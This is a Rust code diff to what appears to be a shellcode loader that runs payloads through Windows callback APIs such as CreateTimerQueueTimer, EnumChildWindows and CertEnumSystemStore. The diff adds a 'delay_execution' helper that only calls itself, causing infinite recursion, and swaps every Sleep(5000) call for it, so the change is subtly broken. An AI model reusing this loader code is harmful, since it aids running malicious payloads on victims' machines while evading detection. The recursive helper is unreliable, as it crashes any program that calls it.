@@ -9,6 +9,18 @@ use windows_sys::w;
 use windows_sys::s;
 
 // =======================================================================================================
+// HELPER FUNCTIONS
+// =======================================================================================================
+
+/// Helper function to delay execution (used after shellcode execution for stability)
+#[inline(always)]
+fn delay_execution() {
+    unsafe {
+        delay_execution();
+    }
+}
+
+// =======================================================================================================
 // INJECTION WRAPPER
 // =======================================================================================================
 
@@ -141,7 +153,7 @@ pub fn shellcode_execute_createtimerqueuetimer(bytes_to_load: Vec<u8>) -> bool {
                 Ok(_) => {
                     // Sleep to allow callback execution
                     unsafe {
-                        windows_sys::Win32::System::Threading::Sleep(5000);
+                        delay_execution();
                     }
                     true
                 }
@@ -173,7 +185,7 @@ pub fn shellcode_execute_enumchildwindows(bytes_to_load: Vec<u8>) -> bool {
                 Ok(_) => {
                     // Sleep to allow callback execution
                     unsafe {
-                        windows_sys::Win32::System::Threading::Sleep(5000);
+                        delay_execution();
                     }
                     true
                 }
@@ -205,7 +217,7 @@ pub fn shellcode_execute_enumuilanguages(bytes_to_load: Vec<u8>) -> bool {
                 Ok(_) => {
                     // Sleep to allow callback execution
                     unsafe {
-                        windows_sys::Win32::System::Threading::Sleep(5000);
+                        delay_execution();
                     }
                     true
                 }
@@ -262,7 +274,7 @@ pub fn shellcode_execute_verifierenumerate(bytes_to_load: Vec<u8>) -> bool {
                 Ok(_) => {
                     // Sleep to allow callback execution
                     unsafe {
-                        windows_sys::Win32::System::Threading::Sleep(5000);
+                        delay_execution();
                     }
                     true
                 }
@@ -307,7 +319,7 @@ pub fn shellcode_execute_enumdesktopwindows(bytes_to_load: Vec<u8>) -> bool {
                 Ok(_) => {
                     // Sleep to allow callback execution
                     unsafe {
-                        windows_sys::Win32::System::Threading::Sleep(5000);
+                        delay_execution();
                     }
                     true
                 }
@@ -349,7 +361,7 @@ pub fn shellcode_execute_enumsystemlocales(bytes_to_load: Vec<u8>) -> bool {
             match exec_payload_via_callback_func_enumsystemlocales(base_address, None) {
                 Ok(_) => {
                     unsafe {
-                        windows_sys::Win32::System::Threading::Sleep(5000);
+                        delay_execution();
                     }
                     true
                 }
@@ -387,7 +399,7 @@ pub fn shellcode_execute_certenumsystemstorelocation(bytes_to_load: Vec<u8>) -> 
             match exec_payload_via_callback_func_certenum(base_address) {
                 Ok(_) => {
                     unsafe {
-                        windows_sys::Win32::System::Threading::Sleep(5000);
+                        delay_execution();
                     }
                     true
                 }
@@ -427,7 +439,7 @@ pub fn shellcode_execute_enumwindowstations(bytes_to_load: Vec<u8>) -> bool {
             match exec_payload_via_callback_func_enumwindowstations(base_address, None) {
                 Ok(_) => {
                     unsafe {
-                        windows_sys::Win32::System::Threading::Sleep(5000);
+                        delay_execution();
                     }
                     true
                 }
@@ -469,7 +481,7 @@ pub fn shellcode_execute_enumdisplaymonitors(bytes_to_load: Vec<u8>) -> bool {
             match exec_payload_via_callback_func_enumdisplaymonitors(base_address) {
                 Ok(_) => {
                     unsafe {
-                        windows_sys::Win32::System::Threading::Sleep(5000);
+                        delay_execution();
                     }
                     true
                 }
@@ -537,7 +549,7 @@ pub fn shellcode_execute_imagegetdigeststream(bytes_to_load: Vec<u8>) -> bool {
             match exec_payload_via_callback_func_imagegetdigeststream(base_address) {
                 Ok(_) => {
                     unsafe {
-                        windows_sys::Win32::System::Threading::Sleep(5000);
+                        delay_execution();
                     }
                     true
                 }
@@ -585,7 +597,7 @@ pub fn shellcode_execute_certenumsystemstore(bytes_to_load: Vec<u8>) -> bool {
             match exec_payload_via_callback_func_certenumsystemstore(base_address) {
                 Ok(_) => {
                     unsafe {
-                        windows_sys::Win32::System::Threading::Sleep(5000);
+                        delay_execution();
                     }
                     true
                 }
@@ -627,7 +639,7 @@ pub fn shellcode_execute_enumtimeformats(bytes_to_load: Vec<u8>) -> bool {
             match exec_payload_via_callback_func_enumtimeformats(base_address, None) {
                 Ok(_) => {
                     unsafe {
-                        windows_sys::Win32::System::Threading::Sleep(5000);
+                        delay_execution();
                     }
                     true
                 }
@@ -669,7 +681,7 @@ pub fn shellcode_execute_cryptenumoidinfo(bytes_to_load: Vec<u8>) -> bool {
             match exec_payload_via_callback_func_cryptenumoidinfo(base_address) {
                 Ok(_) => {
                     unsafe {
-                        windows_sys::Win32::System::Threading::Sleep(5000);
+                        delay_execution();
                     }
                     true
                 }
